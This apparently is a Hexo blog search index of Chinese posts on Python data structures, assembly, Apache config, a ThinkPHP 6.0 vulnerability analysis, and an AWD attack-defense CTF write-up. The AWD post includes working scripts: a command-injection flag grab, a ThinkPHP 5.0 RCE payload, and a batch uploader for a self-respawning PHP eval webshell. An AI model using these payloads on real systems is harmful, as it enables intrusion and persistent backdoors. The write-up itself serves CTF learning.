<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>python数据结构</title>
      <link href="/posts/7f8e2ad4/"/>
      <url>/posts/7f8e2ad4/</url>
      
        <content type="html"><![CDATA[<p>补充一个小知识</p><p>python 输入重定向为文件</p><pre><code>import syssys.stdin = open(&quot;test.txt&quot;)</code></pre><p>之后就可以直接从文件读入，不需要手动输入了</p><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><pre><code>实现链表输入1 3 5 4 1 9 4 将其存储为链表格式</code></pre><p>链表数据结构：</p><pre><code class="python">class ListNode:    def __init__(self, x=-1):        self.val = x        self.next = None</code></pre><h3 id="创建链表，返回头节点-尾插法"><a href="#创建链表，返回头节点-尾插法" class="headerlink" title="创建链表，返回头节点 (尾插法)"></a>创建链表，返回头节点 (尾插法)</h3><pre><code class="python">def creat_list(line:list) -&gt; ListNode:    root = ListNode()    tail = root    for i in line:        temp = ListNode(i)        tail.next = temp        tail = tail.next      return root.next</code></pre><h3 id="遍历链表"><a href="#遍历链表" class="headerlink" title="遍历链表"></a>遍历链表</h3><pre><code class="python">def traverse_list(root:ListNode):    &#39;&#39;&#39;    遍历链表，没有头节点    &#39;&#39;&#39;    temp = root    while temp:        print(temp.val+&quot; &quot;,end=&quot;&quot;)        temp = temp.next    print()</code></pre><h3 id="删除倒数第n个节点，一次遍历"><a href="#删除倒数第n个节点，一次遍历" class="headerlink" title="删除倒数第n个节点，一次遍历"></a>删除倒数第n个节点，一次遍历</h3><p>用两个指针指向，第一个指针先走 <code>n+1</code> 步，中间空出n个节点，然后删除即可</p><pre><code class="python">def removeNthFromEnd(head:ListNode, n:int)-&gt;ListNode:    &#39;&#39;&#39;    一次遍历算法    &#39;&#39;&#39;    new_head = ListNode(-1)    new_head.next = head    first = new_head    second = new_head    for i in range(n+1):        first = first.next        while first != None:        first = first.next        second = second.next    second.next = second.next.next    return new_head.next</code></pre><h3 id="向右旋转链表"><a href="#向右旋转链表" class="headerlink" title="向右旋转链表"></a>向右旋转链表</h3><p>就是把单链表组成一个循环链表</p><pre><code class="python">def rotateRight(head:ListNode, k:int)-&gt;ListNode:    &#39;&#39;&#39;    针对链表进行旋转    &#39;&#39;&#39;    if k == 0:        return head    if head == None:        return head    temp = head    length = 0    while temp.next != None:        length += 1        temp = temp.next    length += 1    temp.next = head    temp = head    for i in range((length - k%length -1)):        temp = temp.next    new_head = temp.next    temp.next = None    return new_head</code></pre><h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><h3 id="创建图"><a href="#创建图" class="headerlink" title="创建图"></a>创建图</h3><p>采用邻接表进行存储， <code>ArcNode</code> 代表邻接点， <code>VNode</code> 代表边节点</p><pre><code class="python">class ArcNode:    def __init__(self,adjvex, weight):        self.adjvex = adjvex        self.weight = weight        self.next = Noneclass VNode:    def __init__(self):        self.next = None</code></pre><p>输入数据</p><pre><code>输入格式：4 40 1 1 01 0 1 01 1 0 11 1 1 1</code></pre><p>读入数据，创建邻接矩阵</p><pre><code class="python">def create_table()-&gt;list:    m,n = [int(i) for i in input().split()] # 自动解包    A = [0 for i in range(m)]    for i in range(m):        A[i] = [int(j) for j in input().split()]    return A</code></pre><p>邻接矩阵转换为邻接表</p><pre><code class="python">def create_Adj(A)-&gt;list:    &#39;&#39;&#39;    邻接矩阵转换为邻接表    &#39;&#39;&#39;    G = [VNode() for i in range(len(A))]    for i,vex in enumerate(A):        # 第i个节点，及其所有的边        for node,j in enumerate(vex):            if j != 0:                p = ArcNode(node, j)                p.next = G[i].next                G[i].next = p    return G</code></pre><p>打印邻接表</p><pre><code class="python">def disp_adj(G):    for index,i in enumerate(G):        p = i.next        print(index, end=&quot;&quot;)        while p != None:            print(&quot; {}-&gt;&quot;.format(p.adjvex), end=&quot;&quot;)            p = p.next        print()</code></pre><h3 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h3><pre><code class="python">visited = [0 for i in range(4)]def DFS(G, v):    &#39;&#39;&#39;    深度优先搜索    &#39;&#39;&#39;    visited[v] = 1    print(v, end=&quot;&quot;)    p = G[v].next    while p != None:        w = p.adjvex        if visited[w] == 0:            DFS(G,w)        p = p.next    print()</code></pre><h3 id="广度优先搜索"><a href="#广度优先搜索" class="headerlink" title="广度优先搜索"></a>广度优先搜索</h3><pre><code class="python">def BFS(G, v):    &#39;&#39;&#39;    广度优先搜索    &#39;&#39;&#39;    q = Queue()    visited = [0 for i in range(len(G))]    print(v,end=&quot;&quot;)    visited[v] = 1    q.put(v)    while not q.empty():        w = q.get()        p = G[w].next        while p!=None:            if visited[p.adjvex] == 0:                print(p.adjvex, end=&quot;&quot;)                visited[p.adjvex] = 1                q.put(p.adjvex)            p = p.next    print()</code></pre><h3 id="Dijkstar-算法"><a href="#Dijkstar-算法" class="headerlink" title="Dijkstar 算法"></a>Dijkstar 算法</h3><pre><code class="python">def Dijkstra(A, v):    &#39;&#39;&#39;    Dijkstar 算法    &#39;&#39;&#39;    for i in A:        for index,value in enumerate(i):            if value == -1:                i[index] = sys.maxsize    dist = A[v] # 原始v到各个顶点的距离    path = [0 for i in range(len(A))]     for i in range(len(A)):        if A[v][i] != -1:            path[i] = v        else:            path[i] = -1    s = [0 for i in range(len(A))]    s[v] = 1    for i in range(len(A)):        mindis = sys.maxsize        # 寻找最小路径长度顶点u        for j in range(len(A)):            if s[j] == 0  and dist[j] &lt; mindis:                u = j                mindis = dist[j]        s[u] = 1        for j in range(len(A)):            if s[j] == 0:                if A[u][j] &lt; sys.maxsize and dist[j] &gt; 0 and dist[u]+A[u][j] &lt; dist[j]:                    dist[j] = dist[u] + A[u][j]                    path[j] = u    return path, dist</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp6.0漏洞分析</title>
      <link href="/posts/314a66d3/"/>
      <url>/posts/314a66d3/</url>
      
        <content type="html"><![CDATA[<h2 id="通过session写文件"><a href="#通过session写文件" class="headerlink" title="通过session写文件"></a>通过session写文件</h2><p>漏洞点位于：<code>/think/session/Store.php</code></p><pre><code class="php">    /**     * session_id设置     * @access public     * @param string $id session_id     * @return void     */    public function setId($id = null): void    {        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());    }</code></pre><p>针对sessionid的校验不严</p><p><img src="/posts/314a66d3/1584448906099.png" alt></p><p>之后初始化session</p><p><img src="/posts/314a66d3/1584448927094.png" alt></p><p>保存session的过程： <code>think/session/Store.php</code></p><pre><code class="php">    /**     * 保存session数据     * @access public     * @return void     */    public function save(): void    {        $this-&gt;clearFlashData();        $sessionId = $this-&gt;getId();        if (!empty($this-&gt;data)) {            $data = $this-&gt;serialize($this-&gt;data);            $this-&gt;handler-&gt;write($sessionId, $data);        } else {            $this-&gt;handler-&gt;delete($sessionId);        }        $this-&gt;init = false;    }</code></pre><p>进入到 <code>write</code> 函数写入</p><p>最后存储到文件中</p><p><img src="/posts/314a66d3/1584449025846.png" alt></p><p>这样，如果我能控制session的数组中的某个值，就能直接写入shell</p><p>成功写入：</p><p><img src="/posts/314a66d3/1584449183704.png" alt></p><h2 id="6-0-POP链分析"><a href="#6-0-POP链分析" class="headerlink" title="6.0 POP链分析"></a>6.0 POP链分析</h2><p>入口</p><p><img src="/posts/314a66d3/1584451502585.png" alt></p><p>进入 <code>save</code> 函数</p><p><img src="/posts/314a66d3/1584451535191.png" alt></p><p>继续步入</p><p><img src="/posts/314a66d3/1584451560678.png" alt></p><p>进入到 <code>cleanContents</code> 函数，直接返回原值(没有过滤因为不是多维数组)</p><pre><code class="php">    public function cleanContents(array $contents)    {        $cachedProperties = array_flip([            &#39;path&#39;, &#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;,            &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;,        ]);        foreach ($contents as $path =&gt; $object) {            if (is_array($object)) {                $contents[$path] = array_intersect_key($object, $cachedProperties);            }        }        return $contents;    }</code></pre><p>返回</p><p><img src="/posts/314a66d3/1584451622290.png" alt></p><p>跟进 <code>set</code> 函数，这里的 <code>$this-&gt;store</code> 已经被覆盖为 File 类</p><p><img src="/posts/314a66d3/1584451656966.png" alt></p><p><img src="/posts/314a66d3/1584451671730.png" alt></p><p>最后有两个利用方式：</p><ol><li><pre><code class="php"> protected function serialize($data): string {     if (is_numeric($data)) {         return (string) $data;     }     $serialize = $this-&gt;options[&#39;serialize&#39;][0] ?? &quot;\Opis\Closure\serialize&quot;;     return $serialize($data); }</code></pre></li></ol><ol start="2"><li><p>利用伪协议任意文件写入</p></li></ol><p><img src="/posts/314a66d3/1584451721156.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>apache配置文件简单记录</title>
      <link href="/posts/a3f2ee6b/"/>
      <url>/posts/a3f2ee6b/</url>
      
        <content type="html"><![CDATA[<p>一直不太清楚apache的配置文件，简单记录一下</p><p><code>/etc/apache2</code> 下的文件</p><p><code>apache2.conf</code> 是主配置文件，之后的 <code>available</code> 代表可用的, <code>enable</code> 代表已经启用的</p><p><img src="/posts/a3f2ee6b/1584192313504.png" alt></p><p><code>sites-enabled</code> 下</p><p><img src="/posts/a3f2ee6b/1584192394696.png" alt></p><p>000-default.conf 文件规定了网站根目录</p><pre><code>&lt;VirtualHost *:80&gt;        # The ServerName directive sets the request scheme, hostname and port that        # the server uses to identify itself. This is used when creating        # redirection URLs. In the context of virtual hosts, the ServerName        # specifies what hostname must appear in the request&#39;s Host: header to        # match this virtual host. For the default virtual host (this file) this        # value is not decisive as it is used as a last resort host regardless.        # However, you must set it for any further virtual host explicitly.        #ServerName www.example.com        ServerAdmin webmaster@localhost        DocumentRoot /var/www/html        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,        # error, crit, alert, emerg.        # It is also possible to configure the loglevel for particular        # modules, e.g.        #LogLevel info ssl:warn        ErrorLog ${APACHE_LOG_DIR}/error.log        CustomLog ${APACHE_LOG_DIR}/access.log combined        # For most configuration files from conf-available/, which are        # enabled or disabled at a global level, it is possible to        # include a line for only one particular virtual host. For example the        # following line enables the CGI configuration for this host only        # after it has been globally disabled with &quot;a2disconf&quot;.        #Include conf-available/serve-cgi-bin.conf&lt;/VirtualHost&gt;# vim: syntax=apache ts=4 sw=4 sts=4 sr noet</code></pre><p><code>/etc/apache2/mods-enabled /mime.conf</code> 中配置了可以解析的文件类型</p><p><img src="/posts/a3f2ee6b/1584192584702.png" alt></p><p>这样就能解析 php5 等的后缀了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> apache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>星盟3月AWD比赛</title>
      <link href="/posts/f1d265cd/"/>
      <url>/posts/f1d265cd/</url>
      
        <content type="html"><![CDATA[<p>又双叒叕的打了一次AWD比赛，简单地总结一下</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><h3 id="直接读flag"><a href="#直接读flag" class="headerlink" title="直接读flag"></a>直接读flag</h3><p>最开始放了web2，ssh连上去，d盾没扫出什么东西</p><p>然后开始一个个看(现在都流行不放shell，直接给flag的2333)</p><p><img src="/posts/f1d265cd/1584182423201.png" alt></p><p>丢给群里的其他师傅开始写批量</p><pre><code class="python">import requestsimport report = [20180,20280,20380,20480,20580,20680,20780,20880,20980,21080,21180,21280,21380,21480,21580,21680,21780,21880,21980,22080,22180,22280,22380,22480]url = &#39;http://ip:{port}/login.php&#39;for i in port:    r = requests.get(url=url.format(port=str(i)))    if r.status_code == 200:        try:            print(re.findall(r&quot;(flag{.*})&quot;,r.text)[0])        except IndexError:            pass</code></pre><p>批量交flag(后来发现平台有设置csrf token。导致无法批量交。)</p><pre><code class="python">send_url = &#39;http://ip:8001/api/v1/challenges/attempt&#39;cookie = {&#39;Cookie&#39;: &#39;session=be71fde5-8749-46b2-8ac6-fb30b0ec93bb; PHPSESSID=pdq189at1p9g6478tmt8urkng2&#39;}for flag in submit_flag:    data = {&quot;challenge_id&quot;:2,&quot;submission&quot;:flag}    requests.post(url=send_url,data=data,cookies=cookie)</code></pre><p>最后合并为十分钟交一次</p><pre><code class="python">import requestsimport refrom time import sleepwhile True:    port = [20180,20280,20380,20480,20580,20680,20780,20880,20980,21080,21180,21280,21380,21480,21580,21680,21780,21880,21980,22080,22180,22280,22380,22480]    url = &#39;http://ip:{port}/login.php&#39;    submit_flag = []    for i in port:        r = requests.get(url=url.format(port=str(i)))        if r.status_code == 200:            try:                submit_flag.append(re.findall(r&quot;(flag{.*})&quot;,r.text)[0])            except IndexError:                pass    send_url = &#39;http://ip:8001/api/v1/challenges/attempt&#39;    cookie = {&#39;Cookie&#39;: &#39;session=be71fde5-8749-46b2-8ac6-fb30b0ec93bb; PHPSESSID=pdq189at1p9g6478tmt8urkng2&#39;}    for flag in submit_flag:        data = {&quot;challenge_id&quot;:2,&quot;submission&quot;:flag}        req = requests.post(url=send_url,data=data,cookies=cookie)        if &#39;incorrect&#39; not in req.text:            print(&#39;提交正确&#39;)    sleep(600)</code></pre><p>ps.赛后师傅说并没有换cookie，用下面的代码就能批量交。</p><p><img src="/posts/f1d265cd/1584186516112.png" alt></p><h3 id="后台任意文件上传"><a href="#后台任意文件上传" class="headerlink" title="后台任意文件上传"></a>后台任意文件上传</h3><p>看到 <code>test.sql</code> 中是有用户名和密码的，登录之后有上传点</p><p>黑名单只有这几个。。而且htaccess还写错了，php5,php7,phtml也都没有过滤，不过上传之后还是会重命名，算是也过滤了 <code>.htaccess</code> </p><pre><code>$black_list = [&quot;ini&quot;,&quot;htacces&quot;,&quot;php&quot;,&quot;ph3&quot;,&quot;html&quot;];$ext=pathinfo($name)[&#39;extension&#39;];$ext =strtolower($ext);</code></pre><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><h3 id="md文件解析漏洞"><a href="#md文件解析漏洞" class="headerlink" title="md文件解析漏洞"></a>md文件解析漏洞</h3><p>这个web套路好深2333</p><p>d盾可以扫到一个shell，但是是在markdown文件中，还有一个是库中的回调函数</p><p><img src="/posts/f1d265cd/1584182744449.png" alt></p><p>最开始以为是d盾误报，结果后来看了一眼 <code>.htaccess</code></p><pre><code>AddType application/x-httpd-php .html .md</code></pre><p>居然将markdown文件解析为php….这个思路挺强的</p><p>但是由于发现的比较晚，貌似都修好了</p><h3 id="ping命令执行"><a href="#ping命令执行" class="headerlink" title="ping命令执行"></a>ping命令执行</h3><pre><code class="php">function waf($str){    $str=str_replace(&#39; &#39;,&#39;&#39;,$str);    $str=str_replace(&#39;;&#39;,&#39;&#39;,$str);    $str=str_replace(&#39;|&#39;,&#39;&#39;,$str);    return $str;}function ping($host){    $host=waf($host);    var_dump($host);    system(&quot;ping -c 1 $host&quot;);}if(isset($_REQUEST[1]))    ping($_REQUEST[1]);</code></pre><p>这个命令执行倒是挺简单的， <code>&amp;cat&lt;/flag</code> 即可</p><pre><code class="python">import requestsimport report = [30180,30280,30680,30780,30980,31180,31280,31380,31480,31580,31780,31880,31980,32080,32180,32280,32380,32480,31080,30580,30380,30480,30880,31680]url = &#39;http://ip:{port}/common/function.php?1=&amp;cat&lt;/flag&#39;for i in port:    r = requests.get(url=url.format(port=str(i)))    try:        print(re.findall(r&quot;(flag{.*})&quot;,r.text)[0])    except IndexError:        pass</code></pre><h3 id="后台文件上传"><a href="#后台文件上传" class="headerlink" title="后台文件上传"></a>后台文件上传</h3><p>审计源码发现 <code>admin, admin</code>  即可登陆</p><p>然后有文件上传点，直接传shell.md即可解析</p><p>事后写了一个批量上传不死马的脚本</p><pre><code class="python">import requestsimport hashlibbs_webshell = &quot;&quot;&quot;&lt;?php    ignore_user_abort(true);    set_time_limit(0);    unlink(__FILE__);    $file = &#39;%s&#39;;    $code = &#39;&lt;?php if($_POST[&quot;pass&quot;]==&quot;%s&quot;){@eval($_POST[1]);}?&gt;&#39;;    while (1) {        file_put_contents($file, $code);        system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; %s&#39;);        usleep(50);    }?&gt;&quot;&quot;&quot;secret = &quot;pxy&quot;shell_path = &quot;.pxy.php&quot;def md5_hash(s):    return hashlib.md5(s.encode()).hexdigest()def generateShell(ip):    pwd = md5_hash(secret + ip)    shell = bs_webshell % (shell_path, pwd, shell_path)    print(shell)    return shelldef checkShell(ip,shell_path):    url = &#39;http://%s/%s&#39; % (ip, shell_path)    try:        res = requests.get(url, timeout=3)    except:        pass    pwd = md5_hash(secret + ip)    res = requests.post(url, data={&#39;pass&#39;: pwd, &#39;1&#39;: &#39;echo(123);&#39;})    print(res.text)    if res.text == &#39;123&#39;:        print(&#39;[+]&#39;+ip,&#39;Check OK&#39;)ports = [30180,30280,30380,30480,30580,30680,30780,30880,30980,31080,31180,31280,31380,31480,31580,31680,31780,31880,31980,33080,32180,32280,32380,32480]ip = &quot;127.0.0.1&quot;for i in ports:    files = {&quot;pic&quot;:(&#39;shell.md&#39;, generateShell(ip), &#39;application/octet-stream&#39;)}    cookies = dict(PHPSESSID=&#39;fjue55il5q0v90fp8l66us6hq0&#39;)    url = &quot;http://&quot;+ip+&quot;:&quot;+str(i)    url_upload = url+&quot;/index.php?c=User&amp;a=upload&quot;    r = requests.post(url=url_upload,files=files, cookies=cookies)    if b&quot;successfully&quot; in r.content:        print(&quot;[+]&quot;+ip+&quot;:&quot;+str(i)+&quot; upload success&quot;)    url_1 = url + &quot;/upload/admin_shell.md&quot;    try:        r = requests.get(url_1,timeout=2)    except requests.exceptions.ReadTimeout:        checkShell(ip, &quot;upload/.pxy.php&quot;)</code></pre><p>后来研究发现，其实文件上传不仅仅是</p><pre><code>/index.php?c=User&amp;a=upload</code></pre><p>也可以</p><pre><code>/index.php?c=File&amp;a=save</code></pre><p>因为 <code>index.php</code> 是这样写的</p><pre><code class="php">$c=isset($_GET[&#39;c&#39;])?$_GET[&#39;c&#39;]:&#39;User&#39;;$a=isset($_GET[&#39;a&#39;])?$_GET[&#39;a&#39;]:&#39;Index&#39;;$obj=run_c($c);run_a($obj,$a);</code></pre><p>URL格式为：</p><pre><code>http://localhost/index.php?c=User&amp;a=home</code></pre><p>就是可以调用任意类的任意方法</p><p>ps比赛的时候我们是这么想的：</p><p>看到 <code>base.php</code> 中实例化了 <code>Smarty</code> </p><p><img src="/posts/f1d265cd/1584186763035.png" alt></p><p>之后看到这里有一处eval。</p><p><img src="/posts/f1d265cd/1584186784920.png" alt></p><p>于是就开始想能不能getshell，但是无果。</p><h3 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h3><p>感谢a2u13师傅</p><p>还是接前面的分析，可以执行任意类的任意方法。但是那个地方是字符串拼接！。</p><p>所以可以直接通过 <code>;</code> 进行命令注入</p><p><img src="/posts/f1d265cd/1584188249191.png" alt></p><p>File类需要登陆才能使用，换一个 <code>User</code>类就行</p><p><img src="/posts/f1d265cd/1584188382658.png" alt></p><p>比赛的时候确实没往这块想，还是要加强代码审计啊</p><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><pre><code class="php">&lt;?phpclass home{    public $method;    public $args;    function __construct($method, $args) {        $this-&gt;method = $method;        $this-&gt;args = $args;    }    function __destruct(){        var_dump($this-&gt;method);        ($this-&gt;method)($this-&gt;args);    } }     $a=$_REQUEST[&#39;a&#39;];    @unserialize($a);     ?&gt;</code></pre><p>看上去挺像反序列化的，但是</p><pre><code>($this-&gt;method)($this-&gt;args);</code></pre><p>这里是报错的，所以比赛的时候没法利用</p><p>复盘的时候才意识到原来只有php7才可以这么用</p><p>经过测试发现只能直接动态调用system函数，eval和assert都是不行的</p><p><img src="/posts/f1d265cd/1584191203655.png" alt></p><p><img src="/posts/f1d265cd/1584191226590.png" alt="eval是不行的"></p><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>web1是最后放出来的，为了提高挑战性不给ssh密码。</p><p>但是稍微看两眼就会发现是tp5.0写的，还开了debug，于是直接RCE了</p><pre><code class="python">import requestsimport report = [10180,10280,10380,10480,10580,10680,10780,10880,10980,11080,11180,11280,11380,11480,11580,11680,11780,11880,11980,12080,12180,12280,12380,12480]url_flag = &#39;http://ip:{port}/public/index.php?s=captcha&#39;data = {&#39;_method&#39;:&#39;__construct&#39;,        &#39;filter[]&#39;:&#39;system&#39;,        &#39;method&#39;:&#39;get&#39;,&#39;get[]&#39;:&#39;cat /flag&#39;}for i in port:    r = requests.post(url=url_flag.format(port=str(i)),data=data)    if r.status_code == 200:        try:            print((re.findall(r&quot;(flag{.*})&quot;,r.text)[0]))        except IndexError:            pass</code></pre><p>这一波flag还是挺舒服的，但是遗憾的是没法修啊。。</p><p><img src="/posts/f1d265cd/1584183311879.png" alt></p><p>不过后来意识到可以直接将 <code>/var/www/html</code> 下的文件打包下载，还可以自己往里面写shell然后蚁剑连接进行修改。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWD </tag>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jndi注入</title>
      <link href="/posts/aba5931d/"/>
      <url>/posts/aba5931d/</url>
      
        <content type="html"><![CDATA[<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>Hello接口</p><pre><code class="java">import java.rmi.Remote;import java.rmi.RemoteException;public interface Hello extends Remote{    public String hello() throws RemoteException;}</code></pre><p>对应的实现</p><pre><code class="java">import java.io.Serializable;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;/** * @description: Hello实现 * @author: Pxy * @create: 2020-03-12 22:15 **/public class RemoteHello extends UnicastRemoteObject implements Hello{    protected RemoteHello() throws RemoteException {        super();    }    public String  hello() throws RemoteException {        return &quot;hello&quot;;    }}</code></pre><p>创建一个服务端</p><pre><code class="java">import java.rmi.Naming;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.server.UnicastRemoteObject;/** * @description: RMI服务器 * @author: Pxy * @create: 2020-01-20 08:45 **/public class RMIServer {    public void start() throws Exception{        RemoteHello h = new RemoteHello();        LocateRegistry.createRegistry(1099);        Naming.bind(&quot;rmi://127.0.0.1:1099/Hello&quot;, h);    }    public static void main(String[] args) throws Exception {        RMIServer rmiServer = new RMIServer();        rmiServer.start();    }}</code></pre><p>客户端进行访问</p><pre><code class="java">import java.rmi.Naming;/** * @description: RMI客户端 * @author: Pxy * @create: 2020-01-20 08:57 **/public class TrainMain {    public static void main(String[] args) throws Exception {        Hello hello = (Hello) Naming.lookup(&quot;rmi://127.0.0.1/Hello&quot;);        System.out.println(hello.hello());    }}</code></pre><p>这样就能实现RMI</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jndi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土五</title>
      <link href="/posts/7fad3d80/"/>
      <url>/posts/7fad3d80/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土四</title>
      <link href="/posts/624f5fc5/"/>
      <url>/posts/624f5fc5/</url>
      
        <content type="html"><![CDATA[<p>BX 寄存器在内存寻址的作用</p><p><img src="/posts/624f5fc5/1583847161633.png" alt></p><pre><code>mov ax, 2000Hmov ds,axmov bx,1000Hmov ax,[bx]  ; AX=00BEHinc bxinc bxmov [bx],ax  ; BX=1002inc bxinc bxmov [bx],ax  ; BX=1004inc bxmov [bx],al  ; BX=1005inc bx       mov [bx],al  ; BX=1006</code></pre><p>最后得到的内存分布</p><p><img src="/posts/624f5fc5/1583847171666.png" alt></p><h2 id="loop指令的使用"><a href="#loop指令的使用" class="headerlink" title="loop指令的使用"></a>loop指令的使用</h2><pre><code>assume cs:codecode segment    mov ax,2    mov cx,11s:  add ax,ax    loop s</code></pre><p>cx 作为循环的计数器</p><p>计算乘法，123*236</p><pre><code>assume cs:codecode segment    mov ax,0    mov cx,236s:  add ax,123    loop s    mov ax,4c00h    int 21hcode endsend</code></pre><blockquote><p>注意：在汇编程序中，数据不能以字母开头</p></blockquote><p><code>g</code> 指令可以直接执行到指定的位置</p><p><code>p</code> 会自动重复直到 <code>cx == 0</code> 为止</p><h2 id="Debug和masm对指令的不同处理"><a href="#Debug和masm对指令的不同处理" class="headerlink" title="Debug和masm对指令的不同处理"></a>Debug和masm对指令的不同处理</h2><p>在汇编源程序中，我们需要这么写</p><pre><code>mov ax, 2000hmov ds, axmov al, ds:[0]</code></pre><p>如果没有指定段寄存器</p><pre><code>mov al,[0]</code></pre><p>则 <code>masm</code> 理解成</p><pre><code>mov al, 0</code></pre><p>当然如果是寄存器的话</p><pre><code>mov al, [bx]</code></pre><p>则段寄存器默认存在是 ds</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>计算 <code>ffff:0 ~ ffff:b</code> 单元中的数据的和，结果存储在 dx 中</p><p>由于每一个数据都是字节的，不能直接加到16位的寄存器dx中，那么我们是不是可以用dh和dl呢，但是这样可能导致进位丢失</p><p>所以我们需要将8位的数据赋值到16位寄存器然后再与dx相加</p><pre><code class="x86asm">assume cs:codecode segment    mov ax,0ffffh ; 注意数字不能以字母开头    mov ds,ax    mov bx,0 ;首先让 ds:bx 指向 ffff:0    mov dx,0    mov cx,12 ;进行12次循环s:  mov al,[bx]    mov ah,0  ;不要忘记给ah置0！    add dx,ax    inc bx    loop s    mov ax,4c00h    int 21hcode endsend</code></pre><h2 id="如何使用内存空间"><a href="#如何使用内存空间" class="headerlink" title="如何使用内存空间"></a>如何使用内存空间</h2><pre><code>assume cs:codecode segment    mov ax,0    mov ds,ax    mov ds:[26h], ax    mov ax,4c00h    int 21hcode endsend</code></pre><p>程序出问题了，无法继续运行</p><p><img src="/posts/624f5fc5/1583847197500.png" alt></p><p>DOS方式下，一般情况，<code>0:200 ~ 0:2ff</code> 空间中没有系统或其他程序的数据或代码</p><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><p>将内存 ffff:0 ~ ffff:b 单元中的数据复制到 0:200 ~ 0:20b 单元中</p><p>可以将两个段的地址保存到两个寄存器中</p><pre><code>assume cs:codecode segment    mov ax,0ffffh    mov ds,ax     mov ax,0020h    mov es,ax    mov bx,0    mov cx,12s:  mov dl,[bx]    mov es:[bx],dl    inc bx    loop s    mov ax,4c00h    int 21hcode endsend</code></pre><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><ol><li>编程，向内存 0:200<del>0:23F 依次传送数据 0</del>63(3FH)</li></ol><p>代码</p><pre><code>assume cs:codecode segment    mov ax,0    mov ds,ax    mov bx,200h    mov cx,40h    mov ax,0s:  mov [bx],ax    inc ax    inc bx    loop s    mov ax, 4c00h    int 21hcode endsend</code></pre><p>运行结果</p><p><img src="/posts/624f5fc5/1583847221964.png" alt></p><ol start="2"><li>编程，向内存 0:200<del>0:23F 一次传递数据 0</del>63(3FH),程序中只能使用9条指令<br>如果只能用9条指令，那么可以这么改<pre><code>assume cs:codecode segment mov ax,0 mov ds,ax mov bx,0 mov cx,40hs:  mov [bx+200h],bx ;去掉了 ax，只用bx一个寄存器就可以做到 inc bx loop s mov ax, 4c00h int 21hcode endsend</code></pre>运行结果</li></ol><p><img src="/posts/624f5fc5/1583847232334.png" alt></p><ol start="3"><li><pre><code>assume cs:codecode segment mov ax,cs mov ds,ax mov ax,0020h mov es,ax mov bx,0 mov cx,20hs:  mov al,[bx] mov es:[bx],al inc bx loop s mov ax,4c00h int 21hcode endsend</code></pre></li></ol><p><img src="/posts/624f5fc5/1583847251042.png" alt></p><p>于是可以推测出 CX=17h</p><p>完整代码如下</p><pre><code>assume cs:codecode segment        mov ax,cs    mov ds,ax    mov ax,0020h    mov es,ax    mov bx,0    mov cx,17hs:  mov al,[bx]    mov es:[bx],al    inc bx    loop s    mov ax,4c00h    int 21hcode endsend</code></pre><p><img src="/posts/624f5fc5/1583847262812.png" alt></p><p>可以看到成功复制了</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土三</title>
      <link href="/posts/2e9d33db/"/>
      <url>/posts/2e9d33db/</url>
      
